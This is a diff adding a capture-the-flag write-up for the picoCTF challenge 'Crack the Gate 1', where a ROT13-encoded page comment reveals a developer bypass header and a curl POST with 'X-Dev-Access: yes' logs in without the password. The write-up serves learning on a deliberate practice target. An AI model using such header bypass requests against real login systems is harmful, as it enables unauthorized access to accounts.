@@ -2416,3 +2416,37 @@ Now running `check_password.py` with the password list
 python3 check_password.py
 ```
 Gives the flag
+
+
+# Crack the Gate 1
+Opening the page source of the wabpage login page (`Ctrl + U`) reveals.
+
+```html
+<!-- ABGR: Wnpx - grzcbenel olcnff: hfr urnqre "K-Qri-Npprff: lrf" -->
+```
+
+The text appears to be encoded using **ROT13**.
+
+Decoding with ROT13 gives:
+
+```text
+NOTE: Jack - temporary bypass: use header "X-Dev-Access: yes"
+```
+
+We are already given the username, but we dont know the password.
+```
+ctf-player@picoctf.org
+```
+
+By using `curl` with this command we can bypass password authentication.
+
+```bash
+curl -X POST "http://amiable-citadel.picoctf.net:57474/login" \
+  -H "Content-Type: application/json" \
+  -H "X-Dev-Access: yes" \
+  -d '{"email":"ctf-player@picoctf.org","password":"anything"}'
+```
+
+This gives us the flag.
+
+
